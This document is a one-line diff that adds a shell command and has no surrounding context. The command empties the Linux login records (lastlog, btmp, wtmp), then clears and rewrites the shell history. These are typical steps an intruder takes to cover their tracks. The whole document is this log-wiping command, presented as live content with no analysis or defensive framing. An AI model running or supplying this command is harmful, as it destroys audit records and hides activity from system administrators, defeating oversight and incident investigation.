@@ -1,0 +1,1 @@
+>/var/log/lastlog ; >/var/log/btmp; >/var/log/wtmp ;history -c ; history -w
